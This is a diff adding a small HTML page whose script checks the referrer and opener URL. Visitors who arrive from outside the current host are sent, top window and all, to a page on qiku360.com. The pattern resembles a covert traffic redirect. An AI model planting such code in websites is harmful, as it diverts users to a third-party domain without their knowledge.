@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+</head>
+<body>
+<script type="text/javascript">
+    var ref = "";
+    if (document.referrer.length > 0) {
+        ref = document.referrer;
+    }
+    try {
+        if (ref.length == 0 && opener.location.href.length > 0) {
+            ref = opener.location.href;
+        }
+    } catch (e) {
+    }
+    var refs = ref.split("?")[0];
+    var host = window.location.hostname;
+    if (host.indexOf("qiku360.com") == -1 && (refs.indexOf(host) == -1 || !ref)) {
+        top.location.href = "http://www.qiku360.com/zonghe/xd_re.html?f="+ 1E4 * Math.random() +"&k="+ (new Date).valueOf();
+    }else {
+        top.location.href = window.location.href;
+    }
+</script>
+</body>
+</html>
